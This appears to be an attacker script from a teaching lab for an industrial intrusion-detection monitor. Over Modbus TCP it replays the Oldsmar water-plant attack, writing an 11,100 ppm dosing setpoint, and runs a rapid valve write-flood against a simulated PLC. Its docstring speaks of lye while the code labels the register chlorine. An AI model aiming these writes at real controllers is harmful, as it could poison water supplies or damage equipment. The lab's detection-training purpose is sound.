"""
attacker.py
------------
Simulates an unauthorized party issuing commands to the PLC. Run this AFTER
plc_simulator.py (and ideally while hmi_client.py and ids_monitor.py are
also running, so you can watch the IDS flag it live).

Two scenarios, picked by command-line argument:

  python3 attacker.py oldsmar   (default) -- replays the real attack pattern
  python3 attacker.py flood     -- a rapid write-flood / replay-style attack

--- The Oldsmar scenario, explained ---
On February 5, 2021, an unknown intruder remotely accessed the control
software at a water treatment plant in Oldsmar, Florida and changed the
sodium hydroxide (lye) setpoint from its normal ~100 ppm to 11,100 ppm --
over a hundred times the safe level. A plant operator watching the screen
saw the setpoint change in real time and immediately reversed it before any
contaminated water reached the distribution system. No automated system
caught it first; a human happened to be looking at the right moment.

That's the whole reason an automated monitor like ids_monitor.py is worth
building: it does systematically, in milliseconds, what in the real
incident depended on a person's attention and good timing.
"""
import json
import sys
import time
from datetime import datetime, timezone

from pymodbus.client import ModbusTcpClient

import config

SOURCE_NAME = "UNKNOWN-REMOTE"  # deliberately not in config.AUTHORIZED_SOURCES


def log_write(register, value):
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source": SOURCE_NAME,
        "register": register,
        "register_name": config.REGISTER_NAMES[register],
        "value": value,
    }
    with open(config.WRITE_LOG_PATH, "a") as f:
        f.write(json.dumps(entry) + "\n")


def run_oldsmar_scenario(client):
    print(f"[{SOURCE_NAME}] Connected. Replaying the Oldsmar, FL attack pattern...")
    time.sleep(1)
    malicious_value = 11100  # the real value from the February 2021 incident
    print(f"[{SOURCE_NAME}] Writing chlorine dosing setpoint -> {malicious_value} ppm "
          f"(safe range is {config.SAFE_RANGES[config.REG_CHLORINE_PPM]})")
    client.write_register(config.REG_CHLORINE_PPM, malicious_value)
    log_write(config.REG_CHLORINE_PPM, malicious_value)
    print(f"[{SOURCE_NAME}] Done. Check ids_monitor.py's output / alerts.log.")


def run_flood_scenario(client):
    print(f"[{SOURCE_NAME}] Connected. Running a rapid write-flood against the valve...")
    for i in range(15):
        value = 0 if i % 2 == 0 else 100
        client.write_register(config.REG_VALVE_POSITION, value)
        log_write(config.REG_VALVE_POSITION, value)
        time.sleep(0.1)
    print(f"[{SOURCE_NAME}] Done. A real version of this could hammer a valve open/closed "
          f"fast enough to damage equipment, independent of whether any single command "
          f"was individually 'in range.'")


if __name__ == "__main__":
    scenario = sys.argv[1] if len(sys.argv) > 1 else "oldsmar"
    client = ModbusTcpClient(config.PLC_HOST, port=config.PLC_PORT)
    client.connect()

    if scenario == "oldsmar":
        run_oldsmar_scenario(client)
    elif scenario == "flood":
        run_flood_scenario(client)
    else:
        print(f"Unknown scenario '{scenario}'. Use 'oldsmar' or 'flood'.")

    client.close()
